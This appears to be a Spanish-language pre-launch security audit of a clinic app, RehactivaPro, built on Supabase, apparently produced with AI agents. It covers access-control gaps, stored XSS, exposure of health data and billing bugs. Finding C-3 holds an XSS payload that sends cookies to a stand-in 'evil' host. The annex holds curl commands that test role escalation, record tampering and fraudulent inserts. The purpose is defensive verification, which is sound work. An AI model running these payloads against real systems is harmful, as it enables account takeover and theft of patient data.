# 🔍 Auditoría pre-lanzamiento — RehactivaPro

> Generado: 2026-06-06 · **Solo análisis** (no se tocó código, DB ni git).
> Alcance: 19 módulos `js/`, `api/informe.js`, `index.html`, `audit_log.sql`, cruzado contra `CLAUDE.md`, `PROYECTO_ESTADO.md`, `PLAN_PROXIMO.md`, `AUDITORIA.md`.

---

## 🤖 Cómo se generó esta auditoría (el "modo automático", en simple)

Esta sección explica el método, para que sepas **cuánto confiar en cada hallazgo**.

**1. Lectura manual primero.** Se leyó a mano, archivo por archivo, todo el código que toca seguridad y datos clínicos: login, permisos, el cliente de Supabase, el endpoint de IA, pacientes, sesiones, facturación, informes, agenda, etc. Eso fijó una "verdad base".

**2. Modo automático (orquestación multi-agente).** Sobre esa base se lanzó una **flota de 32 agentes de IA en paralelo**, cada uno especializado en una parte:
- 8 "auditores", uno por área: **RLS/permisos, endpoint de IA, XSS, secretos, correctitud de datos, calidad de código, UX, tests**.
- Cada auditor leyó el código real de su área y devolvió hallazgos con archivo:línea, escenario y fix.

**3. Verificación adversarial.** Cada hallazgo de seguridad pasó por un **segundo agente cuyo único trabajo era intentar DESMENTIRLO** (asumir que es falso o exagerado hasta que el código lo demuestre). Esto filtra los "falsos positivos" típicos de la IA. Por eso algunos hallazgos quedaron con severidad **más baja** que la inicial: cuando el ataque grave no se podía probar solo con el código, se bajó y se marcó "depende de verificación".

**4. Síntesis y contraste.** Todo se contrastó contra la verdad base manual (corrigiendo números de línea y descartando lo que ya estaba cerrado en los docs).

### ⚠️ El límite más importante de este método
La **RLS (Row Level Security) de Supabase — que es la ÚNICA defensa real de los datos — NO está en el repositorio.** Solo está configurada en el panel de Supabase. Eso significa:

- **Lo que SÍ se puede afirmar leyendo el código** (alta confianza): los 2 XSS, la "lectura abierta", la facturación que no resetea por episodio, el endpoint de IA sin tope, etc.
- **Lo que NO se puede confirmar sin entrar a Supabase** (marcado "verificar en dashboard"): si un terapeuta puede *borrar* o *editar* datos de otros pacientes, o si un anónimo puede leer algo. Para eso están las queries del **Anexo** al final: hay que correrlas para convertir esas dudas en hechos.

**Traducción práctica:** confiá en los hallazgos de código tal cual; los "depende de RLS" son tareas de verificación, no certezas todavía.

---

## 🎯 Resumen ejecutivo — Top 5 antes de producción

1. **Verificá y versioná la RLS, policy por policy, antes de cargar un solo paciente real.** Es el único control que protege la PHI y hoy no es comprobable. Corré las queries del Anexo (anónimo + terapeuta autenticado) sobre las 10 tablas × 4 operaciones, y subí las policies como `.sql` al repo. **Bloqueante.**
2. **Cerrá los 2 XSS almacenados** (`informes.js` Informe Semanal + `pacientes.js:69` datalist de diagnósticos): hoy un **terapeuta** puede inyectar `<img onerror=…>` en un diagnóstico/nombre y ejecutarlo **en la sesión del admin** → toma de cuenta. Confirmado CRÍTICO por verificación adversarial. **Bloqueante.**
3. **Decidí la postura de "lectura abierta" de PHI.** Hoy *cualquier* cuenta autenticada lee la historia clínica + cédula/tel/email de **todos** los pacientes (`auth.js:53`). Es una decisión consciente (S2) pero bajo LOPDP viola minimización. Mínimo: documentarla con base de licitud **y** activar auditoría de **lecturas**; ideal: acotar por terapeuta.
4. **Protegé la API key paga** en `api/informe.js`: hoy no hay tope de tamaño de prompt ni rate-limit → una cuenta autenticada quema el presupuesto de Anthropic en bucle (I4).
5. **`informes` (PHI clínico) no está en el `audit_log` ni versionada, y `created_by`/`deleted_by` se fijan desde el cliente** → sin trazabilidad LOPDP y con atribución falsificable. Sumala al trigger de auditoría, versioná su tabla+RLS, y poné `DEFAULT auth.uid()`/RLS en esas columnas.

---

## ✅ Lo que YA está bien o cerrado (no lo re-persigas)

Cosas que los docs daban por abiertas pero el código actual resuelve — para que no gastes esfuerzo:

- **`validators.js` SÍ está cableado** y es efectivo en pacientes/protocolos/doctores (cédula ecuatoriana con dígito verificador, email, teléfono, fecha) — `pacientes.js:7,100-118`. La vieja "falta de validación de formularios" está mayormente cerrada (queda sin cablear en cita y sesión — menor).
- **Reconexión de Realtime es robusta** ahora: `_doReconnect`→`loadAll(true)`, listeners `online`/`offline`, indicador de conexión (`realtime.js:248-305`). El "no reconecta" de los docs está **desactualizado**.
- **Candado anti-doble-submit** presente y liberado en `finally` en los 3 saves de sesión; además `deleteSession`/`saveSessionEdit` detectan el caso "RLS bloqueó → 0 filas sin error" (`sesiones.js:268,294`). Bien pensado.
- **`esc()` es correcto** (escapa `& < > " '`, `utils.js:22-26`). El problema es *dónde no se llama*, no la función.
- **Secretos: limpios.** `.env` está en `.gitignore`, `.env.local` matchea `*.local`, y `.env` **nunca** aparece en el historial de git. Solo `.env.example` (placeholders). Sin `service_role`/`sk-ant` en el bundle. Confirmado.
- **No hay auto-escalada de rol en el cliente:** `profiles` solo se *lee* (`auth.js:12`), cero writes en todo `js/`. (Igual la RLS de `UPDATE profiles.role` debe bloquearse — ver Anexo.)
- S1 (XSS protocolos), B1 (`done` desincronizado), M1–M4 (código muerto `app.js`) siguen cerrados. `clinical_context` **no** se renderiza como HTML en ningún lado (solo va al prompt IA) → sin XSS por ese campo.

---

## 🔴 CRÍTICO — bloquea el lanzamiento

### C-1 · La RLS no es verificable ni está versionada (todo el modelo authz depende de ella)
**`main.js:66,220` · `permissions.js` (todo) · solo existe `audit_log.sql`** — *(registrado: S2)*
- **Escenario (atacante):** `window.supa` es un handle real. Un terapeuta abre la consola y ejecuta `supa.from('patients').select('*')`, `.update({diag:'x'})`, `.delete()` directo. `hasPermission()` es cosmético. La única barrera es la RLS, que no puedo ver en el repo.
- **Impacto:** si **una** policy falta o está mal (ej. `DELETE session_log` abierto a `authenticated`, `UPDATE patients` sin filtrar por rol), se lee/edita/borra historia clínica de cualquier paciente.
- **Fix:** correr el Anexo completo sobre las 10 tablas × {SELECT/INSERT/UPDATE/DELETE}; **versionar las policies como `.sql`** en el repo. Tratar el JS explícitamente como UX.

### C-2 · "Lectura abierta": cualquier autenticado lee TODA la base clínica
**`auth.js:50-57` (`select('*,session_log(*)')`) · `PROYECTO_ESTADO.md:131`** — *(registrado: S2 / minimización LOPDP)*
- **Escenario:** `loadAll()` trae **todas** las filas de pacientes con su `session_log` anidado, para cualquier rol. Un terapeuta ve anamnesis/diagnóstico/EVA/notas de pacientes que no trata, y cédula/tel/email de **todos**. Una credencial comprometida = exfiltración total con un `SELECT`.
- **Impacto:** radio de daño de cualquier cuenta = 100% de la PHI/PII. Bajo LOPDP falla el principio de **minimización** (dato sensible de salud).
- **Fix:** decidir conscientemente. Fuerte: RLS de `SELECT` acotada al `therapist_id` + admin/secretaria. Mínima: dejarlo **documentado** con base de licitud **y activar auditoría de lecturas** (hoy fuera de alcance, `audit_log.sql:5`).

### C-3 · XSS almacenado en el Informe Semanal (escala a admin)
**`informes.js:248` (diagnóstico), `:252` y `:263` (nombre paciente), `:239`/`:264` (nombre terapeuta)** — *(NUEVO)*
- **Escenario (atacante):** `renderSemanal` arma HTML por concatenación e interpola **crudo, sin `esc()`**: `…'+d+'…` (diagnóstico), `…'+pt.name+'…`, `…'+th.name+'…`. Un **terapeuta** (tiene `editPatient`) guarda como diagnóstico `<img src=x onerror="fetch('//evil/?c='+document.cookie)">`. Cuando el **admin** abre Informes → Semanal, el script corre **en la sesión del admin**.
- **Impacto:** **escalada de privilegios por XSS almacenado** → robo de sesión/anon key, exfiltración de PHI, acciones como admin. Sin CSP no hay mitigación de respaldo.
- **Fix:** envolver en `esc()` cada dato de usuario en `renderSemanal` (diagnóstico, `pt.name`, `th.name`, `th.initials` en `:238-264`).

### C-4 · XSS almacenado vía el datalist de diagnósticos
**`pacientes.js:69` — `dl.innerHTML=unique.map(d=>\`<option value="${d}">\`)`** — *(NUEVO)*
- **Escenario:** `populateDiagList` (al editar paciente y crear episodio) inyecta diagnósticos y nombres de protocolo **crudos** en `value`. Un valor `"><img src=x onerror=…>` rompe el atributo e inyecta. Se dispara cuando otro usuario abre el modal de paciente.
- **Impacto:** mismo vector de toma de cuenta que C-3, por otra superficie.
- **Fix:** `` `<option value="${esc(d)}">` ``.

### C-5 · Tabla `informes` (PHI clínico) sin auditar, sin versionar, con borrado y atribución falsificables
**`informes.js:846-849` (insert), `:887-889` (UPDATE deleted=true) · `audit_log.sql:176-178` (7 tablas, sin `informes`)** — *(registrado: PROYECTO_ESTADO "informes no versionada")*
- **Escenario:** `informes` guarda narrativa clínica + snapshot (= PHI). (1) **No está** en el array de tablas auditadas → cambios sin bitácora LOPDP. (2) Borrado = `UPDATE deleted=true` gateado solo en JS; si la RLS de `UPDATE informes` está abierta, un autenticado borra/**resucita** (`deleted=false`) o sobrescribe informes ajenos. (3) `created_by`/`deleted_by` se fijan desde el cliente → si la columna no tiene `DEFAULT auth.uid()` + RLS, la **autoría es falsificable**.
- **Impacto:** PHI clínico leíble/editable/borrable entre usuarios + sin trazabilidad + atribución no confiable.
- **Fix:** versionar la migración de `informes` (tabla+RLS); sumar `'informes'` al `audit_trigger`; RLS de `UPDATE` solo admin/autor; `created_by/deleted_by` con `DEFAULT auth.uid()`.

---

## 🟠 IMPORTANTE — arreglar pronto

### Seguridad / IA
- **I-1 · Endpoint IA sin tope de prompt ni rate-limit** — `api/informe.js:30-47` *(registrado: I4)*. Acepta cualquier `prompt` de cualquier tamaño, sin límite de frecuencia ni chequeo de rol. **Escenario:** cuenta autenticada (incluso secretaria) manda prompts gigantes en bucle → quema la key paga; `max_tokens:1024` solo capa la salida. **Fix:** rechazar `prompt > ~8-12k` con 413, rate-limit por usuario/min, chequear `viewAI` server-side.
- **I-2 · Prompt injection vía texto libre** — `ia.js:151-170`. Diagnóstico/anamnesis/observaciones/`clinical_context` entran al prompt; la "barrera anti-alucinación" es solo texto. **Impacto** acotado (la salida la lee un humano), pero conviene encerrar el texto del paciente en delimitadores. **Fix:** bloque delimitado + instrucción de tratar lo de adentro como datos, nunca instrucciones.
- **I-3 · Anonimización parcial a Anthropic (LOPDP)** — `ia.js:160-170` *(registrado: I4 / LOPDP)*. Saca nombre/cédula/terapeuta/doctor (bien) pero envía diagnóstico + anamnesis + observaciones (texto libre con posibles identificadores) a EE.UU. **Fix:** documentar a Anthropic como sub-encargado + base de licitud; considerar scrub del texto libre.

### Correctitud de datos
- **I-4 · Facturación no resetea por episodio** — `facturacion.js:13-21` *(registrado: I2)*. **Confirmado abierto.** `sesYaCobradas` suma **todo el histórico** mientras `p.sessions` es episodio-aware → "Cobro X de Y" y la numeración de cajitas (`:86,118`) salen **inflados** tras un nuevo episodio. **Fix:** contar solo facturas con `fecha > último 'Fin de episodio'`.
- **I-5 · Borrado en cascada sin transacción (peor que lo documentado)** — `pacientes.js:280-283` *(registrado: I5/S3)*. Los **3 primeros** `delete` (`session_log`, `cobros`, `appointments`) **no chequean `.error`**; solo el de `patients` lo hace. Si un intermedio falla, igual borra el paciente → **huérfanos silenciosos**. **Fix:** RPC transaccional con chequeo de rol, o `ON DELETE CASCADE`.
- **I-6 · PDF de episodio PASADO muestra datos del episodio ACTUAL** — `informes.js:717,722` *(NUEVO)*. `_buildRenderModel` usa `p.diag`/`doneActual(p)`/`p.sessions` (actuales) mientras la pantalla usa `epDiag`/`epDone`/`epSessions`. Exportar un episodio anterior → **diagnóstico y conteo equivocados** con el `pct%` episodio-aware → informe inconsistente. **Fix:** pasar `epDiag/epDone/epSessions` al render-model.
- **I-7 · `facturaCounter` colisiona entre usuarios concurrentes** — `facturacion.js:318` *(NUEVO)*. El N° de factura se incrementa en memoria del cliente. Dos usuarios cobrando a la vez → mismo `cobro_ref` (`F00X`) duplicado. **Fix:** generar `cobro_ref` server-side (secuencia/RPC).
- **I-8 · `loadAll` silencia errores de 6 de 7 tablas** — `auth.js:59` *(NUEVO)*. Solo `if(th.error) throw`; si fallan pacientes/citas/cobros/informes, la app arranca con listas **vacías sin avisar** → parece "no hay datos" cuando hubo un error. **Fix:** chequear `.error` de cada query y avisar.
- **I-9 · Editar cita permite fecha pasada** — `agenda.js:381` *(registrado: M-g/B4)*. El guard `ds<today` está **después** del `return` de la rama edición (`:364-378`). **Fix:** mover el guard antes de la rama de edición.
- **I-10 · Citas recurrentes: cambios pre-recarga se pierden** — `agenda.js:401` *(registrado: B3/M-g)*. El id `'rec-'+fecha+'-'+<random>` es solo de memoria; `esRealApptId` lo excluye (`:194,199`), así que confirmar/mover una cita recurrente **antes de recargar** no se persiste. La colisión de `Math.random()` es despreciable; el problema real es la **no-persistencia silenciosa**. **Fix:** usar el `id` real del `insert` de cada cita recurrente.

### UX (sube a IMPORTANTE por riesgo de uso real)
- **I-11 · El datalist de diagnóstico queda VACÍO al crear paciente nuevo** — `openPatientModal` no llama `populateDiagList` (sí lo hace `openEditPatient:308`). **Fix:** llamarlo en `openPatientModal` (recordando el fix de C-4 para no abrir XSS).
- **I-12 · Modales sin focus-trap ni cierre con Escape** — todos los modales. No gestionan foco, no atrapan Tab, no cierran con Escape. **Fix:** helper de modal con focus-trap + Escape + restaurar foco.
- **I-13 · `confirm()`/`alert()` bloqueantes; "Cobrar todos" dispara N `alert()` en cadena** — `facturacion.js:346,352`, `agenda.js:140,218,40`, `pacientes.js:274` *(registrado: M-h/B2)*. **Fix:** migrar a modales/toasts; en lote, un solo resumen final.

### Tests / CI
- **I-14 · No hay CI: nada bloquea un deploy roto a producción con PHI** *(registrado: QA)*. **Fix mínimo:** `.github/workflows/ci.yml` con `node --check js/*.js api/*.js` (ya pasa 22/22) + (ideal) lint.
- **I-15 · Facturación, validadores y fronteras de episodio son lógica pura SIN tests** — `facturacion.js`, `validators.js`, `utils.js doneActual` *(registrado: I2 + QA)*. **Fix:** tests unitarios: cédula válida/inválida, `pendientesActual` con/sin episodio, `billingInfo` tras nuevo episodio (cubre I-4), `doneActual` con frontera el mismo día (cubre P-2).
- **I-16 · La RLS no se puede verificar antes de lanzar** *(registrado: S2)*. **Fix:** el checklist del Anexo, corrido y archivado como evidencia antes del go-live.

---

## 🟡 PULIDO — nice-to-have

- **P-1 · Colores (doc/terapeuta) interpolados crudos en `style`** — `pacientes.js:249`, `agenda.js:26,542,158`, `doctores.js:16`. **Hoy NO explotable** (la UI los limita a la paleta fija). Defensa en profundidad: si alguien escribe un `color` arbitrario directo a la tabla (depende de RLS), sería XSS. **Fix:** validar contra paleta o `esc()`.
- **P-2 · Frontera de episodio con `>` estricto** — `utils.js:132,143`. Una sesión registrada **el mismo día** del nuevo episodio cae en el anterior. **Fix:** definir la regla y unificarla con `diagnostico_done.sql`.
- **P-3 · Valores crudos en el PDF** — `informes.js:775,780,784` (`m.numero`, `m.inicio`, `m.paciente.edad`). Datos derivados, bajo riesgo. **Fix:** `esc()` por consistencia.
- **P-4 · Celda "Protocolo" en pantalla pero no en el PDF** — `informes.js:590` vs `_buildRenderModel:714-738` *(registrado, QA)*. **Fix:** sumar `protocolo` al snapshot y a `buildPdfHtml`.
- **P-5 · `": "` colgando en "Evaluación inicial"** *(registrado)*. El código actual usa `filter(Boolean)` → solo afecta **datos viejos**; en altas nuevas ya no aparece.
- **P-6 · `checkAutoNoas` solo cubre hoy** — `agenda.js:43-58` *(registrado: J5)*. Citas pendientes de días pasados nunca pasan a `noas`; marca en memoria sin verificar el `UPDATE` (`:54`).
- **P-7 · Código muerto / vestigial** *(registrado)*: `protocolSVG` + import en `main.js` (M-a); `dbUpdateBillingPendientes` sin callers (`auth.js:259`, M-b); `next_plan` write-only (`sesiones.js:181,335`, M-c); `billing_pendientes:0` en insert (`pacientes.js:175`, M-e); `console.log` de producción (`auth.js:96`, `realtime.js:278`, M-f).
- **P-8 · `simWA` a número fijo de la clínica si no hay tel** — `resumen.js` (M-d). **Fix:** deshabilitar el botón sin teléfono.
- **P-9 · `<title>` y `<link rel="icon">` duplicados** — `index.html:15/600, 17/601` *(registrado: J1)*.
- **P-10 · Validación no cableada en cita y sesión** — `validators.js` se usa en pacientes/protocolos/doctores pero no en cita/sesión. Menor.
- **P-11 · Sin CSP** — `index.html`. Por el uso de `onclick` inline una CSP estricta exige refactor, pero `connect-src`/`script-src` restringidos a Supabase+Anthropic limitarían la exfiltración de los XSS.

---

## 📋 Anexo — Verificación de RLS en Supabase (correr antes de lanzar)

La RLS no está en el repo; sin esto, C-1/C-2/C-5 quedan sin despejar. Setear `U='https://<proyecto>.supabase.co'` y `K='<ANON_KEY>'`.

### A) Anónimo (solo anon key, sin token) — todo DEBE devolver `[]` o 401
```bash
for t in patients session_log informes cobros profiles appointments therapists doctors protocols audit_log; do
  echo "== $t =="; curl -s "$U/rest/v1/$t?select=*&limit=1" -H "apikey: $K"
done
# INSERT/UPDATE/DELETE anónimos (deben fallar):
curl -s -X POST   "$U/rest/v1/patients"   -H "apikey: $K" -H 'content-type: application/json' -d '{"name":"anon"}'
curl -s -X DELETE "$U/rest/v1/session_log?id=eq.<ID>" -H "apikey: $K"
```
Si **cualquiera** devuelve datos o inserta → **CRÍTICO real**.

### B) Terapeuta autenticado (token de un terapeuta de prueba)
```bash
TT=$(curl -s -X POST "$U/auth/v1/token?grant_type=password" -H "apikey: $K" \
  -H 'content-type: application/json' -d '{"email":"tera@test","password":"<pass>"}' | jq -r .access_token)

# B1 — escalada de rol (DEBE afectar 0 filas):
curl -s -X PATCH "$U/rest/v1/profiles?id=eq.<UID_TERA>" -H "apikey: $K" -H "Authorization: Bearer $TT" \
  -H 'content-type: application/json' -H 'Prefer: return=representation' -d '{"role":"admin"}'
# B2 — ¿lee PHI de pacientes que no trata? (mide C-2):
curl -s "$U/rest/v1/patients?select=id,name,cedula,tel,email,diag" -H "apikey: $K" -H "Authorization: Bearer $TT"
# B3 — editar historia clínica ajena (DEBE 0 filas):
curl -s -X PATCH "$U/rest/v1/patients?id=eq.<ID_AJENO>" -H "apikey: $K" -H "Authorization: Bearer $TT" \
  -H 'content-type: application/json' -H 'Prefer: return=representation' -d '{"diag":"tampered"}'
# B4 — borrar sesión clínica (UI lo da solo a admin; ¿la RLS también?):
curl -s -X DELETE "$U/rest/v1/session_log?id=eq.<ID>" -H "apikey: $K" -H "Authorization: Bearer $TT" -H 'Prefer: return=representation'
# B5 — cobro fraudulento:
curl -s -X POST "$U/rest/v1/cobros" -H "apikey: $K" -H "Authorization: Bearer $TT" \
  -H 'content-type: application/json' -d '{"cobro_ref":"FRAUDE","patient_id":"<ID>","n_sessions":1,"date":"2099-01-01"}'
# B6 — resucitar informe ajeno (DEBE 0 filas):
curl -s -X PATCH "$U/rest/v1/informes?id=eq.<ID_AJENO>" -H "apikey: $K" -H "Authorization: Bearer $TT" \
  -H 'content-type: application/json' -H 'Prefer: return=representation' -d '{"deleted":false}'
# B7 — audit_log (DEBE fallar):
curl -s "$U/rest/v1/audit_log?select=*&limit=1" -H "apikey: $K" -H "Authorization: Bearer $TT"
```

### C) En el SQL editor — inventario de policies
```sql
select tablename, policyname, cmd, roles, qual, with_check
  from pg_policies where schemaname='public' order by tablename, cmd;

select relname, relrowsecurity from pg_class
  where relnamespace='public'::regnamespace and relkind='r'
    and relname in ('patients','session_log','appointments','cobros','profiles','therapists','doctors','protocols','informes','audit_log');

-- ¿'informes' tiene el trigger de auditoría? (hoy NO está en audit_log.sql)
select tgname from pg_trigger where tgrelid='public.informes'::regclass and not tgisinternal;
```

**Criterio de aprobación:** ninguna lectura/escritura anónima; B1/B3/B4/B5/B6/B7 afectan 0 filas o fallan; RLS habilitada en las 10 tablas; `UPDATE profiles` no deja a `authenticated` tocar `role`; `informes` tiene trigger de auditoría. Guardá la salida como evidencia.

---

## 🗺️ Orden de ataque sugerido

1. **Correr el Anexo de RLS** (convierte los "depende de RLS" en hechos). Bloqueante.
2. **PR chico de seguridad:** los 2 XSS (C-3, C-4, `esc()`) + I-8 (`loadAll` traga errores) + I-9 (fecha pasada). Bajo riesgo, alto valor.
3. **Facturación correcta:** I-4 (por episodio) + I-7 (`cobro_ref` server-side) + I-5 (cascade transaccional).
4. **Endurecer endpoint IA:** I-1 (tope + rate-limit).
5. **Trazabilidad `informes`:** C-5 (audit + versionar + `created_by`).
6. **CI + tests:** I-14, I-15.
7. **Limpieza:** P-7 (código muerto), I-13 (alerts→toasts), resto de PULIDO.
